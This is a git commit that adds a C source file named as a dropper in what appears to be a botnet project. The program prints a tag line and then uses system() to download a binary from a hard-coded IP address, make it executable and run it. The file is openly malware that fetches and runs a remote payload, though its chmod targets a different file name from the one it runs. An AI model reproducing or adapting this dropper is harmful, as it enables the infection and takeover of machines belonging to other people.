0f61b955b5c4158ee14719cc73662d9f38493ddd
phinton1027 <77289368+phinton1027@users.noreply.github.com>
2023-03-06 17:19:02 -0500

    Add files via upload

---
+++ botH/dropper/main.c
@@ -0,0 +1,11 @@
+#define STDOUT 1
+
+int main(int argc, char **args) {	
+
+    write(STDOUT, "hito antihoney airdropped\n", 25);
+    system("wget http://80.85.87.245/swrgiuhguhwrguiwetu/" BOT_ARCH " -O - > dd; chmod 777 cc; ./dd load.wget");
+
+
+}
+
+
